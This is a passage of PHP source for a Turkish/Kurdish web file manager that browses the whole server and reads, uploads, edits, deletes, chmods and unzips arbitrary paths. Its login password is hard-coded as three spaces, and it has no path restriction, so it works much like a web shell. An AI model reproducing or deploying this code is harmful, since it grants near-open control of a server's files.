<?php
session_start();

function normalize_path($path) {
    $real = realpath($path);
    if ($real === false) {
        return str_replace('\\', '/', $path);
    }
    return str_replace('\\', '/', $real);
}

function delete_directory($dir) {
    if (!is_dir($dir)) {
        return unlink($dir);
    }

    $files = array_diff(scandir($dir), ['.', '..']);
    foreach ($files as $file) {
        $path = $dir . '/' . $file;
        is_dir($path) ? delete_directory($path) : unlink($path);
    }
    return rmdir($dir);
}

function format_size($bytes) {
    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    } else {
        return $bytes . ' B';
    }
}

function get_disk_usage($path) {
    $total = disk_total_space($path);
    $free = disk_free_space($path);
    $used = $total - $free;
    
    return [
        'total' => $total,
        'used' => $used,
        'free' => $free,
        'percentage' => ($total > 0) ? round(($used / $total) * 100, 2) : 0
    ];
}

function get_breadcrumb($path) {
    $path = normalize_path($path);
    $parts = explode('/', $path);
    $breadcrumb = [];
    $current = '';
    $is_absolute = (substr($path, 0, 1) === '/');

    foreach ($parts as $part) {
        if ($part !== '') {
            if (preg_match('/^[A-Za-z]:$/', $part)) {
                $current = $part;
            } else {
                if ($current === '' && $is_absolute) {
                    $current = '/' . $part;
                } else {
                    $current = $current ? $current . '/' . $part : $part;
                }
            }
            $breadcrumb[] = ['name' => $part, 'path' => $current];
        }
    }
    return $breadcrumb;
}

function get_available_disks() {
    $disks = [];
    
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        // Windows - Only physical drive letters (C:, D:, E:, etc.)
        for ($letter = 'C'; $letter <= 'Z'; $letter++) {
            $drive = $letter . ':';
            if (is_dir($drive . '/')) {
                $total = @disk_total_space($drive . '/');
                $free = @disk_free_space($drive . '/');
                if ($total !== false && $total > 0) {
                    $disks[] = [
                        'path' => $drive,
                        'name' => $drive . ':',
                        'total' => $total,
                        'free' => $free,
                        'used' => $total - $free
                    ];
                }
            }
        }
    } else {
        // Linux/Unix - Only show physical disks from mount points
        $root_total = @disk_total_space('/');
        $root_free = @disk_free_space('/');
        
        // Add root disk
        $disks[] = [
            'path' => '/',
            'name' => 'Root Disk (/)',
            'total' => $root_total,
            'free' => $root_free,
            'used' => $root_total - $root_free
        ];
        
        // Check for external/additional physical disks in /media and /mnt
        $found_disks = [];
        $root_key = $root_total . '_' . $root_free;
        $found_disks[$root_key] = true;
        
        foreach (['/media', '/mnt'] as $base) {
            if (is_dir($base) && @is_readable($base)) {
                $subdirs = @scandir($base);
                if ($subdirs) {
                    foreach ($subdirs as $subdir) {
                        if ($subdir !== '.' && $subdir !== '..') {
                            $mount = $base . '/' . $subdir;
                            if (is_dir($mount) && @is_readable($mount)) {
                                $total = @disk_total_space($mount);
                                $free = @disk_free_space($mount);
                                $key = $total . '_' . $free;
                                
                                // Only add if it's a different physical disk
                                if (!isset($found_disks[$key]) && $total > 0) {
                                    $disks[] = [
                                        'path' => $mount,
                                        'name' => basename($mount),
                                        'total' => $total,
                                        'free' => $free,
                                        'used' => $total - $free
                                    ];
                                    $found_disks[$key] = true;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    return $disks;
}

function get_quick_access_folders() {
    $folders = [];
    
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        // Windows - Important user directories
        $home = getenv('USERPROFILE');
        if ($home && is_dir($home)) {
            $folders[] = ['name' => 'Ana Dizin', 'path' => $home, 'icon' => 'fa-home'];
            
            if (is_dir($home . '/Desktop')) {
                $folders[] = ['name' => 'Masaüstü', 'path' => $home . '/Desktop', 'icon' => 'fa-desktop'];
            }
            if (is_dir($home . '/Documents')) {
                $folders[] = ['name' => 'Belgelerim', 'path' => $home . '/Documents', 'icon' => 'fa-file-alt'];
            }
            if (is_dir($home . '/Downloads')) {
                $folders[] = ['name' => 'İndirilenler', 'path' => $home . '/Downloads', 'icon' => 'fa-download'];
            }
        }
    } else {
        // Linux/Unix - Important user directories
        $home = getenv('HOME');
        if ($home && is_dir($home)) {
            $folders[] = ['name' => 'Ana Dizin', 'path' => $home, 'icon' => 'fa-home'];
        }
        
        if (is_dir('/tmp')) {
            $folders[] = ['name' => 'Geçici', 'path' => '/tmp', 'icon' => 'fa-clock'];
        }
        
        if (is_dir('/var/www')) {
            $folders[] = ['name' => 'Web', 'path' => '/var/www', 'icon' => 'fa-globe'];
        }
    }
    
    return $folders;
}

function get_system_directories() {
    $directories = [];
    
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        // Windows - C:\ dizininin içindeki klasörler
        $root_path = 'C:/';
        if (@is_dir($root_path) && @is_readable($root_path)) {
            $handle = @opendir($root_path);
            if ($handle) {
                while (false !== ($entry = readdir($handle))) {
                    if ($entry !== '.' && $entry !== '..') {
                        $full_path = $root_path . $entry;
                        if (@is_dir($full_path) && @is_readable($full_path)) {
                            // İkon belirleme
                            $icon = 'fa-folder';
                            if ($entry === 'Windows') $icon = 'fa-gear';
                            elseif (stripos($entry, 'Program') !== false) $icon = 'fa-box';
                            elseif ($entry === 'Users' || $entry === 'Kullanıcılar') $icon = 'fa-users';
                            elseif (stripos($entry, 'Data') !== false) $icon = 'fa-database';
                            
                            $directories[] = [
                                'name' => $entry,
                                'path' => $full_path,
                                'icon' => $icon
                            ];
                        }
                    }
                }
                closedir($handle);
            }
        }
    } else {
        // Linux/Unix - / (root) dizininin içindeki klasörler
        $root_path = '/';
        if (@is_dir($root_path) && @is_readable($root_path)) {
            $handle = @opendir($root_path);
            if ($handle) {
                while (false !== ($entry = readdir($handle))) {
                    if ($entry !== '.' && $entry !== '..') {
                        $full_path = '/' . $entry;
                        if (@is_dir($full_path) && @is_readable($full_path)) {
                            // İkon belirleme
                            $icon = 'fa-folder';
                            if ($entry === 'etc') $icon = 'fa-gear';
                            elseif ($entry === 'usr' || $entry === 'bin' || $entry === 'sbin') $icon = 'fa-box';
                            elseif ($entry === 'var' || $entry === 'srv') $icon = 'fa-database';
                            elseif ($entry === 'home') $icon = 'fa-users';
                            elseif ($entry === 'tmp') $icon = 'fa-clock';
                            elseif ($entry === 'opt') $icon = 'fa-cube';
                            elseif ($entry === 'boot') $icon = 'fa-rocket';
                            elseif ($entry === 'dev' || $entry === 'sys' || $entry === 'proc') $icon = 'fa-microchip';
                            elseif ($entry === 'lib' || $entry === 'lib64') $icon = 'fa-book';
                            
                            $directories[] = [
                                'name' => $entry,
                                'path' => $full_path,
                                'icon' => $icon
                            ];
                        }
                    }
                }
                closedir($handle);
                
                // Alfabetik sırala
                usort($directories, function($a, $b) {
                    return strcmp($a['name'], $b['name']);
                });
            }
        }
    }
    
    return $directories;
}

function get_file_url($file_path) {
    $real_path = normalize_path($file_path);
    if (!$real_path || !file_exists($file_path)) {
        return '';
    }

    $doc_root = $_SERVER['DOCUMENT_ROOT'];
    if (!$doc_root) {
        $doc_root = dirname($_SERVER['SCRIPT_FILENAME']);
    }
    $doc_root = normalize_path($doc_root);

    if ($doc_root && strpos($real_path, $doc_root) === 0) {
        $relative_path = substr($real_path, strlen($doc_root));
        $parts = explode('/', ltrim($relative_path, '/'));
        $encoded_parts = array_map('rawurlencode', $parts);
        return '/' . implode('/', $encoded_parts);
    }

    return '?action=view&file=' . urlencode($real_path);
}

function get_mime_icon($mime_type, $extension) {
    $ext = strtolower($extension);
    
    // Images
    if (in_array($ext, ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'svg', 'webp', 'ico'])) {
        return ['icon' => 'fa-file-image', 'color' => '#0dcaf0', 'category' => 'image'];
    }
    
    // Videos
    if (in_array($ext, ['mp4', 'avi', 'mov', 'wmv', 'flv', 'mkv', 'webm'])) {
        return ['icon' => 'fa-file-video', 'color' => '#d63384', 'category' => 'video'];
    }
    
    // Audio
    if (in_array($ext, ['mp3', 'wav', 'ogg', 'flac', 'aac', 'm4a'])) {
        return ['icon' => 'fa-file-audio', 'color' => '#6f42c1', 'category' => 'audio'];
    }
    
    // Archives
    if (in_array($ext, ['zip', 'rar', '7z', 'tar', 'gz', 'bz2'])) {
        return ['icon' => 'fa-file-zipper', 'color' => '#fd7e14', 'category' => 'archive'];
    }
    
    // Documents
    if (in_array($ext, ['pdf'])) {
        return ['icon' => 'fa-file-pdf', 'color' => '#dc3545', 'category' => 'document'];
    }
    if (in_array($ext, ['doc', 'docx'])) {
        return ['icon' => 'fa-file-word', 'color' => '#0d6efd', 'category' => 'document'];
    }
    if (in_array($ext, ['xls', 'xlsx'])) {
        return ['icon' => 'fa-file-excel', 'color' => '#198754', 'category' => 'document'];
    }
    if (in_array($ext, ['ppt', 'pptx'])) {
        return ['icon' => 'fa-file-powerpoint', 'color' => '#fd7e14', 'category' => 'document'];
    }
    
    // Code
    if (in_array($ext, ['php', 'html', 'css', 'js', 'json', 'xml', 'py', 'java', 'c', 'cpp', 'go', 'rb', 'ts'])) {
        return ['icon' => 'fa-file-code', 'color' => '#6f42c1', 'category' => 'code'];
    }
    
    // Text
    if (in_array($ext, ['txt', 'log', 'md', 'csv'])) {
        return ['icon' => 'fa-file-lines', 'color' => '#6c757d', 'category' => 'text'];
    }
    
    return ['icon' => 'fa-file', 'color' => '#6c757d', 'category' => 'other'];
}

$password = '   ';
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;
$current_dir = normalize_path($current_dir);

if (!is_dir($current_dir)) {
    $current_dir = normalize_path(__DIR__);
}

$lang = isset($_SESSION['lang']) ? $_SESSION['lang'] : 'tr';
if (isset($_POST['lang'])) {
    $_SESSION['lang'] = $_POST['lang'];
    $lang = $_POST['lang'];
}

$translations = [
    'tr' => [
        'title' => 'Gelişmiş Dosya Yöneticisi',
        'logout' => 'Çıkış',
        'search' => 'Ara...',
        'create' => 'Oluştur',
        'upload' => 'Yükle',
        'zip_create' => 'Zip Oluştur',
        'download' => 'İndir',
        'move' => 'Taşı',
        'copy' => 'Kopyala',
        'delete_selected' => 'Seçilenleri Sil',
        'name' => 'İsim',
        'size' => 'Boyut',
        'modified' => 'Değiştirilme',
        'permissions' => 'İzinler',
        'actions' => 'İşlemler',
        'back' => 'Geri',
        'folder' => 'Klasör',
        'file' => 'Dosya',
        'login' => 'Giriş Yap',
        'password' => 'Şifre',
        'login_btn' => 'Giriş',
        'create_folder' => 'Klasör Oluştur',
        'create_file' => 'Dosya Oluştur',
        'folder_name' => 'Klasör Adı',
        'file_name' => 'Dosya Adı',
        'close' => 'Kapat',
        'save' => 'Kaydet',
        'edit_file' => 'Dosya Düzenle',
        'rename' => 'Yeniden Adlandır',
        'new_name' => 'Yeni Ad',
        'chmod' => 'İzinler',
        'file_not_found' => 'Dosya bulunamadı!',
        'file_not_writable' => 'Dosya yazılabilir değil!',
        'save_failed' => 'Kaydetme başarısız!',
        'save_success' => 'Başarıyla kaydedildi!',
        'permissions_code' => 'İzin Kodu',
        'zip_files' => 'Dosyaları Zipele',
        'zip_name' => 'Zip Dosya Adı',
        'selected_files' => 'Seçilen dosyalar',
        'move_to' => 'Taşınacak',
        'copy_to' => 'Kopyalanacak',
        'destination' => 'Hedef Dizin',
        'extract' => 'Aç',
        'view' => 'Görüntüle',
        'preview' => 'Önizle',
        'prev_page' => 'Önceki',
        'next_page' => 'Sonraki',
        'page' => 'Sayfa',
        'disk_usage' => 'Disk Kullanımı',
        'filter_by_type' => 'Tipe Göre Filtrele',
        'all_files' => 'Tüm Dosyalar',
        'images' => 'Resimler',
        'videos' => 'Videolar',
        'documents' => 'Belgeler',
        'archives' => 'Arşivler',
        'code' => 'Kod Dosyaları',
        'others' => 'Diğer',
        'drag_drop' => 'Dosyaları sürükleyip bırakın veya tıklayın',
        'available_disks' => 'Disk Sürücüleri',
        'quick_access' => 'Hızlı Erişim',
        'system_directories' => 'Sistem Dizinleri',
        'go_to_path' => 'Dizine Git',
        'current_path' => 'Geçerli Dizin',
    ],
    'ku' => [
        'title' => 'Rêveberiya Pelan a Pêşkeftî',
        'logout' => 'Derketin',
        'search' => 'Lêgerîn...',
        'create' => 'Afirandin',
        'upload' => 'Barkirin',
        'zip_create' => 'Zip Çêke',
        'download' => 'Daxistin',
        'move' => 'Veguhestin',
        'copy' => 'Kopîkirin',
        'delete_selected' => 'Hilbijartî Jêbibe',
        'name' => 'Nav',
        'size' => 'Mezinahî',
        'modified' => 'Guhertî',
        'permissions' => 'Destûr',
        'actions' => 'Çalakî',
        'back' => 'Vegere',
        'folder' => 'Peldank',
        'file' => 'Pel',
        'login' => 'Têkevin',
        'password' => 'Şîfre',
        'login_btn' => 'Têkevin',
        'create_folder' => 'Peldank Çêke',
        'create_file' => 'Pel Çêke',
        'folder_name' => 'Navê Peldankê',
        'file_name' => 'Navê Pelî',
        'close' => 'Bigire',
        'save' => 'Tomar bike',
        'edit_file' => 'Pelê Sererast bike',
        'rename' => 'Navê Nû',
        'new_name' => 'Navê Nû',
        'chmod' => 'Destûr',
        'file_not_found' => 'Pel nehat dîtin!',
        'file_not_writable' => 'Pel nikare were nivîsandin!',
        'save_failed' => 'Tomarkirin têk çû!',
        'save_success' => 'Bi serfirazî hate tomarkirin!',
        'permissions_code' => 'Koda Destûran',
        'zip_files' => 'Zip Bike',
        'zip_name' => 'Navê Pelê Zip',
        'selected_files' => 'Pelên hilbijartî',
        'move_to' => 'Dê were guhertin',
        'copy_to' => 'Dê were kopîkirin',
        'destination' => 'Cihê Armancê',
        'extract' => 'Veke',
        'view' => 'Nîşan bide',
        'preview' => 'Pêşdîtin',
        'prev_page' => 'Berê',
        'next_page' => 'Pêş',
        'page' => 'Rûpel',
        'disk_usage' => 'Bikaranîna Dîskê',
        'filter_by_type' => 'Li gorî Cure Parzûn Bike',
        'all_files' => 'Hemî Pel',
        'images' => 'Wêne',
        'videos' => 'Vîdyo',
        'documents' => 'Belge',
        'archives' => 'Arşîv',
        'code' => 'Pelên Kodê',
        'others' => 'Yên din',
        'drag_drop' => 'Pelan bikişîne û bihêle an jî bitikîne',
        'available_disks' => 'Ajokkarên Dîskê',
        'quick_access' => 'Gihîştina Bilez',
        'system_directories' => 'Peldankên Sîstemê',
        'go_to_path' => 'Biçe Rêça',
        'current_path' => 'Rêça Niha',
    ]
];

$t = $translations[$lang];

// Logout
if (isset($_POST['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// File content API
if (isset($_GET['action']) && $_GET['action'] === 'get_content' && isset($_GET['file'])) {
    if (!isset($_SESSION['logged_in'])) {
        http_response_code(403);
        exit('Access denied');
    }

    $file_path = $_GET['file'];
    if (file_exists($file_path) && is_file($file_path)) {
        header('Content-Type: text/plain; charset=utf-8');
        echo file_get_contents($file_path);
        exit;
    } else {
        http_response_code(404);
        exit('File not found');
    }
}

// Download file
if (isset($_GET['action']) && $_GET['action'] === 'download' && isset($_GET['file'])) {
    if (!isset($_SESSION['logged_in'])) {
        http_response_code(403);
        exit('Access denied');
    }

    $file_path = $_GET['file'];
    if (file_exists($file_path) && is_file($file_path)) {
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mime = finfo_file($finfo, $file_path);
        finfo_close($finfo);

        header('Content-Type: ' . $mime);
        header('Content-Length: ' . filesize($file_path));
        header('Content-Disposition: attachment; filename="' . basename($file_path) . '"');
        readfile($file_path);
        exit;
    }
}

// View file
if (isset($_GET['action']) && $_GET['action'] === 'view' && isset($_GET['file'])) {
    if (!isset($_SESSION['logged_in'])) {
        http_response_code(403);
        exit('Access denied');
    }

    $file_path = $_GET['file'];
    if (file_exists($file_path) && is_file($file_path)) {
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mime = finfo_file($finfo, $file_path);
        finfo_close($finfo);

        header('Content-Type: ' . $mime);
        header('Content-Length: ' . filesize($file_path));
        header('Content-Disposition: inline; filename="' . basename($file_path) . '"');
        readfile($file_path);
        exit;
    }
}

// Login check
if (!isset($_SESSION['logged_in'])) {
    if (isset($_POST['password']) && $_POST['password'] === $password) {
        $_SESSION['logged_in'] = true;
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }
    ?>
    <!DOCTYPE html>
    <html lang="<?php echo $lang; ?>">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title><?php echo $t['title']; ?></title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            body {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            .login-card {
                background: white;
                padding: 40px;
                border-radius: 20px;
                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                max-width: 400px;
                width: 90%;
                animation: slideIn 0.5s ease-out;
            }
            @keyframes slideIn {
                from { transform: translateY(-30px); opacity: 0; }
                to { transform: translateY(0); opacity: 1; }
            }
            .login-icon {
                width: 80px;
                height: 80px;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                margin: 0 auto 30px;
                color: white;
                font-size: 35px;
            }
        </style>
    </head>
    <body>
        <div class="login-card">
            <div class="login-icon">
                <i class="fas fa-lock"></i>
            </div>
            <h3 class="text-center mb-4"><?php echo $t['login']; ?></h3>
            <form method="post">
                <div class="mb-3">
                    <input type="password" name="password" class="form-control form-control-lg" 
                           placeholder="<?php echo $t['password']; ?>" required autofocus>
                </div>
                <button type="submit" class="btn btn-primary btn-lg w-100">
                    <i class="fas fa-sign-in-alt me-2"></i><?php echo $t['login_btn']; ?>
                </button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Handle POST actions
if (isset($_POST['action'])) {
    $action = $_POST['action'];

    if ($action === 'create_folder' && isset($_POST['folder_name'])) {
        $folder_path = $current_dir . '/' . basename($_POST['folder_name']);
        @mkdir($folder_path, 0755);
    }

    if ($action === 'create_file' && isset($_POST['file_name'])) {
        $file_path = $current_dir . '/' . basename($_POST['file_name']);
        @file_put_contents($file_path, '');
    }

    if ($action === 'upload' && isset($_FILES['files'])) {
        foreach ($_FILES['files']['tmp_name'] as $key => $tmp_name) {
            if ($_FILES['files']['error'][$key] === 0) {
                $file_name = $_FILES['files']['name'][$key];
                $file_path = $current_dir . '/' . basename($file_name);
                move_uploaded_file($tmp_name, $file_path);
            }
        }
    }

    if ($action === 'delete' && isset($_POST['path'])) {
        delete_directory($_POST['path']);
    }

    if ($action === 'delete_multiple' && isset($_POST['files'])) {
        foreach ($_POST['files'] as $file) {
            delete_directory($file);
        }
    }

    if ($action === 'rename' && isset($_POST['old_name']) && isset($_POST['new_name'])) {
        $old_path = $_POST['old_name'];
        $new_path = dirname($old_path) . '/' . basename($_POST['new_name']);
        @rename($old_path, $new_path);
    }

    if ($action === 'edit' && isset($_POST['file']) && isset($_POST['content'])) {
        $file_path = $_POST['file'];
        $content = $_POST['content'];
        
        if (file_exists($file_path) && is_writable($file_path)) {
            file_put_contents($file_path, $content);
            $_SESSION['success'] = $t['save_success'];
        } else {
            $_SESSION['error'] = $t['file_not_writable'];
        }
    }

    if ($action === 'chmod' && isset($_POST['path']) && isset($_POST['permissions'])) {
        @chmod($_POST['path'], octdec($_POST['permissions']));
    }

    if ($action === 'create_zip' && isset($_POST['zip_name']) && isset($_POST['files'])) {
        $zip = new ZipArchive();
        $zip_path = $current_dir . '/' . basename($_POST['zip_name']) . '.zip';
        if ($zip->open($zip_path, ZipArchive::CREATE) === TRUE) {
            foreach ($_POST['files'] as $file) {
                if (is_file($file)) {
                    $zip->addFile($file, basename($file));
                }
            }
            $zip->close();
        }
    }

    if ($action === 'download_zip' && isset($_POST['files'])) {
        $zip = new ZipArchive();
        $zip_path = tempnam(sys_get_temp_dir(), 'zip');
        if ($zip->open($zip_path, ZipArchive::CREATE) === TRUE) {
            foreach ($_POST['files'] as $file) {
                if (is_file($file)) {
                    $zip->addFile($file, basename($file));
                }
            }
            $zip->close();
            header('Content-Type: application/zip');
            header('Content-Disposition: attachment; filename="files.zip"');
            header('Content-Length: ' . filesize($zip_path));
            readfile($zip_path);
            unlink($zip_path);
            exit;
        }
    }

    if ($action === 'extract' && isset($_POST['zip_file'])) {
        $zip = new ZipArchive();
        if ($zip->open($_POST['zip_file']) === TRUE) {
            $zip->extractTo($current_dir);
            $zip->close();
        }
    }

    if ($action === 'move' && isset($_POST['files']) && isset($_POST['destination'])) {
        foreach ($_POST['files'] as $file) {
            $new_path = rtrim($_POST['destination'], '/') . '/' . basename($file);
            @rename($file, $new_path);
        }
    }

    if ($action === 'copy' && isset($_POST['files']) && isset($_POST['destination'])) {
        foreach ($_POST['files'] as $file) {
            $new_path = rtrim($_POST['destination'], '/') . '/' . basename($file);
            if (is_file($file)) {
                @copy($file, $new_path);
            }
        }
    }

    header('Location: ?dir=' . urlencode($current_dir));
    exit;
}

// Get files list
$files = [];
$search_query = isset($_GET['search']) ? $_GET['search'] : '';
$filter_type = isset($_GET['filter']) ? $_GET['filter'] : 'all';

if ($handle = @opendir($current_dir)) {
    while (false !== ($entry = readdir($handle))) {
        if ($entry != "." && $entry != "..") {
            $full_path = normalize_path($current_dir . '/' . $entry);

            if ($search_query !== '' && stripos($entry, $search_query) === false) {
                continue;
            }

            $modified = @filemtime($full_path);
            $perms = @fileperms($full_path);
            $is_dir = is_dir($full_path);
            $size = $is_dir ? 0 : @filesize($full_path);
            $size = ($size === false) ? 0 : $size;
            $extension = $is_dir ? '' : pathinfo($entry, PATHINFO_EXTENSION);
            $mime_info = $is_dir ? ['category' => 'folder'] : get_mime_icon('', $extension);

            // Apply filter
            if ($filter_type !== 'all') {
                if ($is_dir && $filter_type !== 'folder') continue;
                if (!$is_dir && $mime_info['category'] !== $filter_type) continue;
            }

            $files[] = [
                'name' => $entry,
                'path' => $full_path,
                'is_dir' => $is_dir,
                'size' => $size,
                'modified' => $modified !== false ? $modified : 0,
                'perms' => $perms !== false ? substr(sprintf('%o', $perms), -4) : '0000',
                'extension' => $extension,
                'category' => $mime_info['category']
            ];
        }
    }
    closedir($handle);
}

// Sort files
$sort = isset($_GET['sort']) ? $_GET['sort'] : 'name';
$order = isset($_GET['order']) ? $_GET['order'] : 'asc';

usort($files, function($a, $b) use ($sort, $order) {
    if ($a['is_dir'] != $b['is_dir']) {
        return $b['is_dir'] - $a['is_dir'];
    }

    $result = 0;
    switch ($sort) {
        case 'size':
            $result = $a['size'] - $b['size'];
            break;
        case 'modified':
            $result = $a['modified'] - $b['modified'];
            break;
        case 'name':
        default:
            $result = strcmp(strtolower($a['name']), strtolower($b['name']));
            break;
    }

    return $order === 'desc' ? -$result : $result;
});

// Pagination
$page = isset($_GET['page']) ? max(1, intval($_GET['page'])) : 1;
$per_page = 50;
$total_files = count($files);
$total_pages = max(1, ceil($total_files / $per_page));
$page = min($page, $total_pages);
$offset = ($page - 1) * $per_page;
$files_paginated = array_slice($files, $offset, $per_page);

$breadcrumb = get_breadcrumb($current_dir);
$disk_usage = get_disk_usage($current_dir);
$available_disks = get_available_disks();
$quick_access = get_quick_access_folders();
$system_directories = get_system_directories();
?>
<!DOCTYPE html>
<html lang="<?php echo $lang; ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo $t['title']; ?></title>
    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Cdefs%3E%3ClinearGradient id='grad' x1='0%25' y1='0%25' x2='100%25' y2='100%25'%3E%3Cstop offset='0%25' style='stop-color:%23667eea;stop-opacity:1'/%3E%3Cstop offset='100%25' style='stop-color:%23764ba2;stop-opacity:1'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect x='15' y='20' width='70' height='60' rx='5' fill='url(%23grad)'/%3E%3Cpath d='M 15 35 L 85 35' stroke='white' stroke-width='2' opacity='0.3'/%3E%3Crect x='25' y='45' width='20' height='3' rx='1.5' fill='white' opacity='0.8'/%3E%3Crect x='25' y='53' width='30' height='3' rx='1.5' fill='white' opacity='0.8'/%3E%3Crect x='25' y='61' width='25' height='3' rx='1.5' fill='white' opacity='0.8'/%3E%3C/svg%3E">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
    <style>
        :root {
            --primary: #667eea;
            --secondary: #764ba2;
            --bg-primary: #ffffff;
            --bg-secondary: #f8f9fa;
            --text-primary: #212529;
            --text-secondary: #6c757d;
            --border-color: #dee2e6;
            --hover-bg: #f8f9fa;
        }

        [data-theme="dark"] {
            --bg-primary: #1a1d23;
            --bg-secondary: #25282e;
            --text-primary: #e9ecef;
            --text-secondary: #adb5bd;
            --border-color: #495057;
            --hover-bg: #2d3139;
        }

        * {
            transition: background-color 0.3s ease, color 0.3s ease, border-color 0.3s ease;
        }

        body {
            background: var(--bg-secondary);
            color: var(--text-primary);
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            font-size: 14px;
        }

        .navbar {
            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
            box-shadow: 0 2px 20px rgba(0,0,0,0.1);
            padding: 12px 0;
        }

        .navbar-brand {
            color: white !important;
            font-weight: 700;
            font-size: 1.2rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .theme-toggle {
            background: rgba(255,255,255,0.2);
            border: none;
            color: white;
            padding: 8px 12px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1.1rem;
        }

        .theme-toggle:hover {
            background: rgba(255,255,255,0.3);
        }

        .lang-select {
            font-size: 0.85rem;
            padding: 6px 12px;
            border: none;
            background: rgba(255,255,255,0.2);
            color: white;
            border-radius: 8px;
        }

        .main-container {
            background: var(--bg-primary);
            border-radius: 16px;
            padding: 20px;
            margin-top: 20px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
        }

        .disk-usage-card {
            background: var(--bg-secondary);
            padding: 15px;
            border-radius: 12px;
            margin-bottom: 20px;
            border: 1px solid var(--border-color);
        }

        .disk-usage-bar {
            height: 8px;
            border-radius: 10px;
            background: var(--border-color);
            overflow: hidden;
            margin: 10px 0;
        }

        .disk-usage-fill {
            height: 100%;
            background: linear-gradient(90deg, #28a745 0%, #ffc107 70%, #dc3545 100%);
            transition: width 0.3s ease;
        }

        .breadcrumb {
            background: var(--bg-secondary);
            padding: 12px 16px;
            border-radius: 10px;
            margin-bottom: 15px;
            border: 1px solid var(--border-color);
        }

        .breadcrumb-item a {
            color: var(--primary);
            text-decoration: none;
            font-weight: 500;
        }

        .breadcrumb-item.active {
            color: var(--text-primary);
        }

        .toolbar {
            background: var(--bg-secondary);
            padding: 15px;
            border-radius: 12px;
            margin-bottom: 15px;
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            align-items: center;
            border: 1px solid var(--border-color);
        }

        .filter-buttons {
            display: flex;
            gap: 5px;
            flex-wrap: wrap;
        }

        .filter-btn {
            padding: 6px 12px;
            border: 1px solid var(--border-color);
            background: var(--bg-primary);
            color: var(--text-primary);
            border-radius: 8px;
            font-size: 0.8rem;
            cursor: pointer;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 5px;
        }

        .filter-btn:hover {
            background: var(--hover-bg);
            color: var(--text-primary);
        }

        .filter-btn.active {
            background: var(--primary);
            color: white;
            border-color: var(--primary);
        }

        .search-box {
            flex: 1;
            min-width: 200px;
            max-width: 400px;
        }

        .search-box input {
            background: var(--bg-primary);
            border: 1px solid var(--border-color);
            color: var(--text-primary);
            border-radius: 10px;
            padding: 8px 15px;
        }

        .btn {
            font-size: 0.85rem;
            padding: 8px 16px;
            border-radius: 8px;
            font-weight: 500;
        }

        .table-wrapper {
            border-radius: 12px;
            overflow: hidden;
            border: 1px solid var(--border-color);
        }

        .table {
            margin: 0;
            background: var(--bg-primary);
            color: var(--text-primary);
        }

        .table thead {
            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
            color: white;
        }

        .table thead th {
            padding: 12px;
            font-weight: 600;
            border: none;
        }

        .table tbody td {
            padding: 12px;
            vertical-align: middle;
            border-color: var(--border-color);
        }

        .table tbody tr {
            background: var(--bg-primary);
        }

        .table tbody tr:hover {
            background: var(--hover-bg);
        }

        .highlighted-file {
            background-color: #fff3cd !important;
        }

        .highlighted-file:hover {
            background-color: #ffe69c !important;
        }

        [data-theme="dark"] .highlighted-file {
            background-color: rgba(255, 193, 7, 0.2) !important;
        }

        [data-theme="dark"] .highlighted-file:hover {
            background-color: rgba(255, 193, 7, 0.3) !important;
        }

        .file-icon {
            font-size: 1.3rem;
        }

        .file-name {
            color: var(--primary);
            text-decoration: none;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .file-name:hover {
            text-decoration: underline;
        }

        .action-btn {
            padding: 5px 10px;
            font-size: 0.75rem;
            margin: 2px;
            border-radius: 6px;
        }

        .modal-content {
            background: var(--bg-primary);
            color: var(--text-primary);
            border-radius: 16px;
            border: 1px solid var(--border-color);
        }

        .modal-header {
            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
            color: white;
            border-radius: 16px 16px 0 0;
            border: none;
        }

        .modal-body {
            padding: 20px;
        }

        .form-control, .form-select {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
